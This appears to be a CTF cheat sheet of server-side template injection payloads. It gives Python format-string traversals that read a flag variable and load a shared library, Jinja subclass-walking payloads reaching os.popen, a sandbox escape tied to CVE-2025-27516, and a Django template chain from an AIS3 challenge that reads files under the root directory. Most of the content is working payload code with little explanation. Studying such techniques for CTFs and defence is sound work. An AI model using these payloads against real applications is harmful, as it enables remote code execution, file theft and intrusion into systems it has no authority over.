# SSTI

## format string

### Read var
`{0.__init__.__globals__[__builtins__][quit].__init__.__globals__[sys].modules[flag].flag}`

### Load libary to RCE

[BuckeyeCTF 2024](https://corgi.rip/posts/buckeye-writeups/)

```
import pathlib
import ctypes
a = pathlib.Path.cwd()
print("{a.unlink.__globals__[sys].modules[ctypes].cdll[/tmp/testload]}".format(a=a))
```

![](https://github.com/user-attachments/assets/b262a53b-b256-4951-a60b-6df7fbc12c0c)

![](https://github.com/user-attachments/assets/88ced995-b409-4dc8-b890-f3d7052af33b)

## jinja

找 warnings

`{{''.__class__.__mro__[1].__subclasses__()[182].__init__.__dir__()}}`

`{{''.__class__.__mro__[1].__subclasses__()[182].__init__.__globals__["__builtins__"]["__import__"]('os').popen('ls').read()}}`

## [CVE-2025-27516](https://github.com/pallets/jinja/commit/90457bbf33b8662926ae65cdde4c4c32e756e403) 

### Read var

`{{'{0.__init__.__globals__[__builtins__][quit].__init__.__globals__[sys].modules[flag].flag}'|attr('format')(xxx)}}`

### Load libary to RCE

`{{'{0.__init__.__globals__[__builtins__][quit].__init__.__globals__[sys].modules[ctypes].cdll[/tmp/lib.so]}'|attr('format')(xxx)}}`

## django

### AIS3-2026-eof Welcome To The Django

```
{%for f in request.resolver_match.tried.1.0.urlconf_name.views.html.parser.re.enum.sys.modules.pathlib.Path.cwd.parent.iterdir%}
  {%if f.name.36%}
    {%for s in f.iterdir%}
      {{s.read_text}}
    {%endfor%}
  {%endif%}
{%endfor%}
```

1. WSGIRequest
2. ResolverMatch
3. `[[<URLResolver <URLPattern list> (admin:admin) 'admin/'>], [<URLResolver <module 'echo.urls' from '/app/echo/urls.py'> (None:None) ''>, <URLPattern '' [name='index']>]]`
4. `[<URLResolver <module 'echo.urls' from '/app/echo/urls.py'> (None:None) ''>, <URLPattern '' [name='index']>]`
5. `<URLResolver <module 'echo.urls' from '/app/echo/urls.py'> (None:None) ''>`
6. `<module 'echo.urls' from '/app/echo/urls.py'>`

```python
from django.urls import path

from . import views

urlpatterns = [
    path("", views.index, name="index"),
]
```

7. `<module 'echo.views' from '/app/echo/views.py'>`

```python
import html
from django.http import HttpResponse
from django.template import engines
def index(request):
    return HttpResponse(engines["django"].from_string('').render({}, request))
```

8. `<module 'html' from '/usr/local/lib/python3.14/html/__init__.py'>`
9. `<module 'html.parser' from '/usr/local/lib/python3.14/html/parser.py'>`
10. `<module 're' from '/usr/local/lib/python3.14/re/__init__.py'>`
11. `<module 'enum' from '/usr/lib/python3.14/enum.py'>`
12. `<module 'sys' (built-in)>`
13. modules (all imported modules dict)
14. `<module 'pathlib' from '/usr/lib/python3.14/pathlib.py'>`
15. `<class 'pathlib.Path'>`
16. `Path.cwd()` -> `PosixPath('/app')`
17. `PosixPath.parent` -> `PosixPath('/')`
18. `PosixPath.iterdir()` -> `<generator object Path.iterdir>`
19. for loop 1
20. `PosixPath.name[36] != 0`
21. `PosixPath.iterdir()` -> `<generator object Path.iterdir>`
22. for loop 2
23. `PosixPath.read_text()`

```python
for f in request.resolver_match.tried[1][0].urlconf_name.views.html.parser.re.enum.sys.modules['pathlib'].Path.cwd().parent.iterdir():
    if f.name[36]:
        for s in f.iterdir():
            print(s.read_text())
```
